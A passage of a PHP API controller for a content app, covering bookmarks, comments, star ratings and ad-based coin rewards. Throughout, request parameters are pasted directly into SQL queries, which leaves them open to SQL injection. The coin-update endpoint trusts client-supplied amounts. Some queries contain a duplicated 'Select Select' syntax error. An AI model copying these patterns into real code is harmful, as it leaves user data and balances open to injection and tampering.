                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //==============================================================================//
    public function get_bookmark_content()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $user_id = $_GET['user_id'];
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN bookmark_table
					            ON content_table.content_id = bookmark_table.bookmark_content_id
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (bookmark_user_id = $user_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN bookmark_table
					            ON content_table.content_id = bookmark_table.bookmark_content_id
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (bookmark_user_id = $user_id) AND (bookmark_content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }

    }


    //=================================================================================//
    public function get_all_after_login()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {

                // API key is correct
                if(isset($_REQUEST['user_username']))
                    $user_username = $_REQUEST['user_username'];
                if (!empty($user_username)) {
                    $query = $this->db->get_where('user_table', array('user_username'=>$user_username));
                    if ($query->num_rows() > 0)
                    {
                        $q = $this->db->query("Select setting_table.*, user_table.user_id, user_table.user_username, user_table.user_firstname, user_table.user_lastname, user_table.user_status, user_table.user_image, user_table.user_mobile, user_table.user_email, user_table.user_coin, user_table.user_credit, 
                                                      user_table.user_referral, user_table.user_mobile_verified, user_table.user_email_verified, user_table.user_role_id, user_table.user_hide_banner_ad, user_table.user_hide_interstitial_ad,
                                                      user_role_table.user_role_title, admob_setting_table.*,
                                                      reward_coin_table.*
                                               FROM setting_table
                                               INNER JOIN user_table
                                               INNER JOIN admob_setting_table
                                               INNER JOIN user_role_table
                                               ON user_table.user_role_id = user_role_table.user_role_id
                                               INNER JOIN reward_coin_table
                                               WHERE (setting_table.setting_id = 1 AND admob_setting_table.admob_setting_id = 1 AND user_username = '$user_username');");
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_referral_count()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                }else{
                    $user_id = $this->input->post('user_id');
                    $this->db->select($user_id);
                    $this->db->where('user_referral', $user_id);
                    $q = $this->db->get('user_table');
                    echo $q->num_rows();
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_only_user_coin()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                }else{
                    $user_id = $this->input->post('user_id');
                    $q = $this->db->get_where('user_table', array('user_id'=> $user_id));
                    echo $user_coin = $q->row()->user_coin;
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_all_before_login()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {

                // API key is correct
                $q = $this->db->query("Select setting_table.*, admob_setting_table.*, reward_coin_table.*
                                       FROM setting_table
                                       INNER JOIN admob_setting_table
									   INNER JOIN reward_coin_table
                                       WHERE setting_table.setting_id = 1 AND admob_setting_table.admob_setting_id = 1;");
                echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function add_comment()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('comment_user_id', 'comment_user_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('comment_content_id', 'comment_content_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('comment_device_type_id', 'comment_device_type_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('comment_text', 'comment_text', 'trim|xss_clean');
                $this->form_validation->set_rules('comment_rate', 'comment_text', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                }else{
                    $comment_status = "0";
                    $comment_text = $this->input->post('comment_text');
                    if($comment_text == "")
                    {
                        $comment_status = "1"; //Only Rated. No need to check comment.
                        $comment_text = $this->lang->line("Only rated.");
                    }

                    $comment_user_id = $this->input->post('comment_user_id');
                    $comment_content_id =  $this->input->post('comment_content_id');
                    $comment_device_type_id =  $this->input->post('comment_device_type_id');
                    $comment_text = $comment_text;
                    $comment_rate = $this->input->post('comment_rate');
                    $comment_user_ip = $this->input->ip_address();
                    $comment_user_agent = $_SERVER['HTTP_USER_AGENT'];
                    $comment_time = now();

                    //Check if user sent review before or not
                    $query = $this->db->query("Select * FROM comment_table WHERE (comment_user_id = '$comment_user_id') AND (comment_content_id = '$comment_content_id');");

                    if ($query->num_rows() > 0){
                        echo "YouSetReviewRecently";

                    }else{
                        $dataArray = array(
                            "comment_user_id" => $comment_user_id,
                            "comment_content_id" => $comment_content_id,
                            "comment_device_type_id" => $comment_device_type_id,
                            "comment_text" => $comment_text,
                            "comment_rate" => $comment_rate,
                            "comment_user_ip" => $comment_user_ip,
                            "comment_user_agent" => $comment_user_agent,
                            "comment_time" => $comment_time,
                            "comment_status" => $comment_status,
                        );
                        if($this->Common_model->data_insert("comment_table",$dataArray))
                        {
                            //Update user coin
                            $q = $this->db->get_where('reward_coin_table', array('reward_coin_id'=> 1));
                            $user_coin = $q->row()->reward_coin_write_review; //Number of coin that user reward

                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$comment_user_id'");

                            $dataArrayUser = array(
                                "activity_user_id" => $comment_user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from write a review").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);

                            echo "Success";
                        }

                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_rating_average()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $content_id = $_GET['content_id'];
                if (!empty($content_id))
                {
                    $queryTotalRate = $this->db->query("SELECT SUM(comment_rate) AS comment_rate
                                FROM comment_table
                                WHERE (comment_content_id = '$content_id' AND comment_status = 1);");
                    $total_rate = $queryTotalRate->row()->comment_rate;

                    if($total_rate != "")
                    {
                        $queryRowRate = $this->db->query("Select comment_id
                                        FROM comment_table
                                        WHERE (comment_content_id = '$content_id' AND comment_status = 1);");
                        $row_rate = $queryRowRate->num_rows();

                        $queryFiveStar = $this->db->query("Select comment_id
                                        FROM comment_table
                                        WHERE (comment_content_id = '$content_id' AND comment_status = 1 AND comment_rate = 5);");
                        $five_star = $queryFiveStar->num_rows();
                        $five_star_average = ($five_star / $row_rate) * 100;

                        $queryFourStar = $this->db->query("Select comment_id
                                        FROM comment_table
                                        WHERE (comment_content_id = '$content_id' AND comment_status = 1 AND comment_rate = 4);");
                        $four_star = $queryFourStar->num_rows();
                        $four_star_average = ($four_star / $row_rate) * 100;

                        $queryThreeStar = $this->db->query("Select comment_id
                                        FROM comment_table
                                        WHERE (comment_content_id = '$content_id' AND comment_status = 1 AND comment_rate = 3);");
                        $three_star = $queryThreeStar->num_rows();
                        $three_star_average = ($three_star / $row_rate) * 100;

                        $queryTwoStar = $this->db->query("Select comment_id
                                        FROM comment_table
                                        WHERE (comment_content_id = '$content_id' AND comment_status = 1 AND comment_rate = 2);");
                        $two_star = $queryTwoStar->num_rows();
                        $two_star_average = ($two_star / $row_rate) * 100;

                        $queryOneStar = $this->db->query("Select comment_id
                                        FROM comment_table
                                        WHERE (comment_content_id = '$content_id' AND comment_status = 1 AND comment_rate = 1);");
                        $one_star = $queryOneStar->num_rows();
                        $one_star_average = ($one_star / $row_rate) * 100;

                        $rate_average = $total_rate / $row_rate;
                        //echo(round($rate_average,2));

                        //Update Rating Average and Rating Count into the content table
                        $this->db->query("UPDATE content_table SET content_rating_average = round($rate_average,2), content_rating_count = $row_rate WHERE content_id = '$content_id'");

                        $output = array("total_rate"=>$total_rate, "row_rate"=>$row_rate, "rate_average"=>round($rate_average,2), "one_star"=>$one_star, "one_star_average"=>round($one_star_average,0), "two_star"=>$two_star,
                                        "two_star_average"=>round($two_star_average,0), "three_star"=>$three_star, "three_star_average"=>round($three_star_average,0), "four_star"=>$four_star, "four_star_average"=>round($four_star_average,0),
                                        "five_star"=>$five_star, "five_star_average"=>round($five_star_average,0));
                        echo "[";
                        echo json_encode($output, JSON_UNESCAPED_UNICODE);
                        echo "]";

                    }else{
                        echo 0;
                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_best_rated_content()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_table.content_rating_count > 4)
								ORDER BY content_id DESC, content_table.content_rating_average DESC, content_table.content_rating_count DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_table.content_rating_count > 4) AND (content_id < $last_id)
								ORDER BY content_id DESC, content_table.content_rating_average DESC, content_table.content_rating_count DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_best_rated_content_new()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title,
                                              
                                              comment_table.*,
                                              COUNT(comment_table.comment_id) AS comment_count,
                                              AVG(comment_table.comment_rate) AS rating_average,
                                              COUNT(comment_table.comment_id) * AVG(comment_table.comment_rate) AS total_score
                                              
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                
                                INNER JOIN comment_table
                                ON content_table.content_id = comment_table.comment_content_id
                                
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
                                                               
								WHERE (content_status = $content_status)
								GROUP BY comment_content_id
								ORDER BY total_score DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title,
                                              
                                              comment_table.*,
                                              COUNT(comment_table.comment_id) AS comment_count,
                                              AVG(comment_table.comment_rate) AS rating_average,
                                              COUNT(comment_table.comment_id) * AVG(comment_table.comment_rate) AS total_score
                                              
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                
                                INNER JOIN comment_table
                                ON content_table.content_id = comment_table.comment_content_id
                                
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
                                                               
								WHERE (content_status = $content_status) AND (content_id < $last_id)
								GROUP BY comment_content_id
								ORDER BY total_score DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_comments()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_id = $_GET['content_id'];
                $comment_status = 1; // 0: Not Approved | 1: Approved | 2: Removed

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select comment_table.comment_id, comment_table.comment_user_id, comment_table.comment_text, comment_table.comment_rate, comment_table.comment_time, device_type_table.device_type_title, user_table.user_username, user_table.user_image
                                FROM comment_table
                                INNER JOIN device_type_table
                                ON comment_table.comment_device_type_id = device_type_table.device_type_id
                                INNER JOIN user_table
                                ON comment_table.comment_user_id = user_table.user_id
								WHERE (comment_status = $comment_status) AND (comment_content_id = '$content_id')
								ORDER BY comment_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select comment_table.comment_id, comment_table.comment_user_id, comment_table.comment_text, comment_table.comment_rate, comment_table.comment_time, device_type_table.device_type_title, user_table.user_username, user_table.user_image
                                FROM comment_table
                                INNER JOIN device_type_table
                                ON comment_table.comment_device_type_id = device_type_table.device_type_id
                                INNER JOIN user_table
                                ON comment_table.comment_user_id = user_table.user_id
								WHERE (comment_status = $comment_status) AND (comment_content_id = '$content_id') AND (comment_id < $last_id)
								ORDER BY comment_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function update_user_coin()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_coin', 'user_coin', 'trim|required|xss_clean');
                $this->form_validation->set_rules('update_coin_type', 'update_coin_type', 'trim|required|xss_clean');
                $this->form_validation->set_rules('expiration_time', 'expiration_time', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                } else {
                    //Update user_coin
                    $user_id = $this->input->post('user_id');
                    $user_coin = $this->input->post('user_coin');
                    $update_coin_type = $this->input->post('update_coin_type'); // --> bannerAd , interstitialAd ,
                    $update_coin_status = 1; // == --> 0: Expired , 1: Active

                    $query = $this->db->query("Select * FROM update_coin_table WHERE (update_coin_user_id = '$user_id') AND (update_coin_type = '$update_coin_type') AND (update_coin_status = '$update_coin_status');");
                    if ($query->num_rows() > 0)
                    {
                        //Exist
                        if ($update_coin_type == "bannerAd") {
                            $current_time = time(); // Time Now
                            $expired_at = $this->input->post('expiration_time');
                            $update_coin_time = $query->row()->update_coin_time; // Time that click on ads before
                            if ($update_coin_time+($expired_at) < $current_time) {
                                $this->db->query("UPDATE update_coin_table SET update_coin_status = 0 WHERE update_coin_time = '$update_coin_time'");
                                $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");
                                $dataArray = array(
                                    "update_coin_user_id" => $user_id,
                                    "update_coin_type" => $update_coin_type,
                                    "update_coin_time" => now(),
                                    "update_coin_user_ip" => $this->input->ip_address(),
                                    "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "update_coin_status" => 1,
                                );
                                $this->Common_model->data_insert("update_coin_table",$dataArray);

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User earned coin from ads").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                                );
                                if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                                if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                            }

                        }elseif ($update_coin_type == "interstitialAd") {
                            $current_time = time(); // Time Now
                            $expired_at = $this->input->post('expiration_time');
                            $update_coin_time = $query->row()->update_coin_time; // Time that click on ads before
                            if ($update_coin_time + ($expired_at) < $current_time) {
                                $this->db->query("UPDATE update_coin_table SET update_coin_status = 0 WHERE update_coin_time = '$update_coin_time'");
                                $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");
                                $dataArray = array(
                                    "update_coin_user_id" => $user_id,
                                    "update_coin_type" => $update_coin_type,
                                    "update_coin_time" => now(),
                                    "update_coin_user_ip" => $this->input->ip_address(),
                                    "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "update_coin_status" => 1,
                                );
                                $this->Common_model->data_insert("update_coin_table", $dataArray);

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User earned coin from ads").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                                );
                                if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                                if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                            }

                        }elseif ($update_coin_type == "PlayGame") {
                            $current_time = time(); // Time Now
                            $expired_at = $this->input->post('expiration_time');
                            $update_coin_time = $query->row()->update_coin_time; // Time that click on ads before
                            if ($update_coin_time + ($expired_at) < $current_time) {
                                $this->db->query("UPDATE update_coin_table SET update_coin_status = 0 WHERE update_coin_time = '$update_coin_time'");
                                $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");
                                $dataArray = array(
                                    "update_coin_user_id" => $user_id,
                                    "update_coin_type" => $update_coin_type,
                                    "update_coin_time" => now(),
                                    "update_coin_user_ip" => $this->input->ip_address(),
                                    "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "update_coin_status" => 1,
                                );
                                $this->Common_model->data_insert("update_coin_table", $dataArray);

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User earned coin from play game").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                                );
                                if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                                if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                            }

                        }elseif ($update_coin_type == "openURL") {
                            $current_time = time(); // Time Now
                            $expired_at = $this->input->post('expiration_time');
                            $update_coin_time = $query->row()->update_coin_time; // Time that click on ads before
                            if ($update_coin_time + ($expired_at) < $current_time) {
                                $this->db->query("UPDATE update_coin_table SET update_coin_status = 0 WHERE update_coin_time = '$update_coin_time'");
                                $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");
                                $dataArray = array(
                                    "update_coin_user_id" => $user_id,
                                    "update_coin_type" => $update_coin_type,
                                    "update_coin_time" => now(),
                                    "update_coin_user_ip" => $this->input->ip_address(),
                                    "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "update_coin_status" => 1,
                                );
                                $this->Common_model->data_insert("update_coin_table", $dataArray);

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User earned coin from opening URL").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                                );
                                if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                                if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                            }

                        }elseif ($update_coin_type == "playVideo") {
                            $current_time = time(); // Time Now
                            $expired_at = $this->input->post('expiration_time');
                            $update_coin_time = $query->row()->update_coin_time; // Time that click on ads before
                            if ($update_coin_time + ($expired_at) < $current_time) {
                                $this->db->query("UPDATE update_coin_table SET update_coin_status = 0 WHERE update_coin_time = '$update_coin_time'");
                                $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");
                                $dataArray = array(
                                    "update_coin_user_id" => $user_id,
                                    "update_coin_type" => $update_coin_type,
                                    "update_coin_time" => now(),
                                    "update_coin_user_ip" => $this->input->ip_address(),
                                    "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "update_coin_status" => 1,
                                );
                                $this->Common_model->data_insert("update_coin_table", $dataArray);

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User earned coin from watching video").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                                );
                                if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                                if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                            }

                        }elseif ($update_coin_type == "playMusic") {
                            $current_time = time(); // Time Now
                            $expired_at = $this->input->post('expiration_time');
                            $update_coin_time = $query->row()->update_coin_time; // Time that click on ads before
                            if ($update_coin_time + ($expired_at) < $current_time) {
                                $this->db->query("UPDATE update_coin_table SET update_coin_status = 0 WHERE update_coin_time = '$update_coin_time'");
                                $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");
                                $dataArray = array(
                                    "update_coin_user_id" => $user_id,
                                    "update_coin_type" => $update_coin_type,
                                    "update_coin_time" => now(),
                                    "update_coin_user_ip" => $this->input->ip_address(),
                                    "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "update_coin_status" => 1,
                                );
                                $this->Common_model->data_insert("update_coin_table", $dataArray);

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User earned coin from listen to music").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                                );
                                if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                                if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                            }
                        }


                    }else{
                        //Not Exist
                        if ($update_coin_type == "bannerAd") {
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");

                            $dataArray = array(
                                "update_coin_user_id" => $user_id,
                                "update_coin_type" => $update_coin_type,
                                "update_coin_time" => now(),
                                "update_coin_user_ip" => $this->input->ip_address(),
                                "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "update_coin_status" => 1,
                            );
                            $this->Common_model->data_insert("update_coin_table",$dataArray);

                            $dataArrayUser = array(
                                "activity_user_id" => $user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from ads").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                            if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");

                        }elseif ($update_coin_type == "interstitialAd") {
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");

                            $dataArray = array(
                                "update_coin_user_id" => $user_id,
                                "update_coin_type" => $update_coin_type,
                                "update_coin_time" => now(),
                                "update_coin_user_ip" => $this->input->ip_address(),
                                "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "update_coin_status" => 1
                            );
                            $this->Common_model->data_insert("update_coin_table",$dataArray);

                            $dataArrayUser = array(
                                "activity_user_id" => $user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from ads").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                            if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");

                        }elseif ($update_coin_type == "playGame") {
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");

                            $dataArray = array(
                                "update_coin_user_id" => $user_id,
                                "update_coin_type" => $update_coin_type,
                                "update_coin_time" => now(),
                                "update_coin_user_ip" => $this->input->ip_address(),
